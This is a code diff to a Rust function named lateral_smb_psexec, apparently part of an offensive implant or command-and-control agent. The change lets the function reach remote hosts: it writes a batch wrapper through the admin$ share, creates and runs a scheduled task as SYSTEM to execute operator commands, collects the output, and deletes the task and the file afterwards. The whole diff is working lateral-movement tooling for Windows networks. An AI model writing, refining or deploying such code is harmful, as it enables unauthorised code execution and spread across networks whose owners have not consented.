@@ -82,14 +82,20 @@ fn lateral_smb_psexec(v: &serde_json::Value) -> TaskOutput {
     }
     unsafe { fn_close(scm) };
 
-    // Write a batch wrapper so the > redirect is not re-interpreted by the outer cmd /C
+    let is_local = host == "127.0.0.1" || host.eq_ignore_ascii_case("localhost");
+
+    // Write bat wrapper so the > redirect isn't re-interpreted by cmd /C.
+    // For remote targets, write via admin$ UNC; the task on the remote sees the local path.
     let bat_path = format!("C:\\Windows\\Temp\\~dmlat{id}.bat");
     let bat = format!("@echo off\r\n{cmd} > \"{rem_out}\" 2>&1\r\n");
-    if std::fs::write(&bat_path, bat.as_bytes()).is_err() {
+    let bat_write_path = if is_local {
+        bat_path.clone()
+    } else {
+        format!("\\\\{host}\\admin$\\Temp\\~dmlat{id}.bat")
+    };
+    if std::fs::write(&bat_write_path, bat.as_bytes()).is_err() {
         return TaskOutput::failure("smb-psexec: failed to write bat wrapper");
     }
-
-    let is_local = host == "127.0.0.1" || host.eq_ignore_ascii_case("localhost");
     let (create_cmd, run_cmd, del_cmd) = if is_local {
         (
             format!("schtasks /Create /RU SYSTEM /TN {task_nm} /TR \"{bat_path}\" /SC ONCE /ST 00:00 /F"),
@@ -124,7 +130,7 @@ fn lateral_smb_psexec(v: &serde_json::Value) -> TaskOutput {
         if std::time::Instant::now() >= deadline { break; }
     }
     let _ = shell_run(&del_cmd);
-    let _ = std::fs::remove_file(&bat_path);
+    let _ = std::fs::remove_file(&bat_write_path);
 
     if output.is_empty() {
         TaskOutput::failure(&format!("smb-psexec: no output from {host} within {timeout}s"))
